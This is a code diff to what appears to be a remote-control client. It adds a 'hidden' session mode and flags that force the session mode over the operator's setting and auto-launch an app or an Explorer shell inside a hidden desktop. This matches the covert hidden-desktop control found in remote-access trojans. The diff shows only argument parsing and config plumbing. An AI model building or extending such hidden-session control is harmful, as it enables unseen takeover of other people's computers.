@@ -45,6 +45,19 @@ def _configure_logging() -> None:
     )
 
 
+def _normalize_session_mode(value: str | None) -> str | None:
+    if not value:
+        return None
+    lowered = str(value).strip().lower()
+    if lowered in {"view", "viewer", "readonly"}:
+        return "view"
+    if lowered in {"hidden", "hidden-manage", "hidden_manage", "hidden-desktop", "hidden_desktop"}:
+        return "hidden"
+    if lowered in {"manage", "control", "full"}:
+        return "manage"
+    return None
+
+
 def main() -> None:
     _configure_logging()
     ensure_dpi_awareness()
@@ -79,6 +92,20 @@ def main() -> None:
         "--team-id",
         help="Team identifier bound to this client (optional).",
     )
+    parser.add_argument(
+        "--mode",
+        choices=["manage", "view", "hidden"],
+        help="Force session mode (overrides operator mode).",
+    )
+    parser.add_argument(
+        "--hidden-app",
+        help="Auto-launch an app when hidden desktop starts (name or path).",
+    )
+    parser.add_argument(
+        "--hidden-shell",
+        action="store_true",
+        help="Autostart Explorer shell inside hidden desktop.",
+    )
     args = parser.parse_args()
     session_id = resolve_session_id(args.session_id)
     team_id = resolve_team_id(args.team_id)
@@ -93,6 +120,16 @@ def main() -> None:
             "countries": list(antifraud_config.countries),
         }
     }
+    forced_mode = _normalize_session_mode(args.mode)
+    if forced_mode:
+        os.environ["RC_FORCE_MODE"] = forced_mode
+        client_config["force_mode"] = forced_mode
+    if args.hidden_app:
+        os.environ["RC_HIDDEN_AUTOSTART_APP"] = str(args.hidden_app)
+        client_config["hidden_autostart_app"] = str(args.hidden_app)
+    if args.hidden_shell:
+        os.environ["RC_HIDDEN_AUTOSTART_SHELL"] = "1"
+        client_config["hidden_autostart_shell"] = True
     client = build_client(
         session_id,
         signaling_token,
